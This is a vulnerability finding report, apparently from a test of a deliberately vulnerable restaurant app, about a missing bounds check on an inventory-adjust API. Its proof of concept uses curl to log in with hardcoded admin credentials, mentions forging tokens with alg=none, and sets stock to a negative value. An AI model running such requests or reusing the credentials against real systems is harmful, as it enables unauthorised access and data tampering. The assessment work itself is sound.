# H9 — Improper Inventory Management (V16)

**Severity:** High  
**CWE:** CWE-840 | **OWASP:** API9:2023  
**Status:** Confirmed  
**Source draft:** `piolium/findings-draft/p7-016-v16-improper-inventory.md`

## Summary

`POST /api/kitchen/inventory/adjust` accepts `set_to` and `delta` without bounds checks. Negative stock, extreme values, no audit. Reachable by any staff/admin JWT, and the JWT is forgeable via V20 (C7).

## PoC

```bash
# Get staff token (or forge alg=none)
TOKEN=$(curl -s -X POST http://localhost:4443/api/staff/session \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@thelocalplate.com","password":"Admin@2024!"}' | jq -r .token)

curl -X POST http://localhost:4443/api/kitchen/inventory/adjust \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"menu_item_id":6,"set_to":-25,"location":"main-kitchen","reason":"manual correction"}'
# Response: {"stock":-25, "previous":1, ...}
```

Requires `ENABLE_ADVANCED_VULNS=true`.
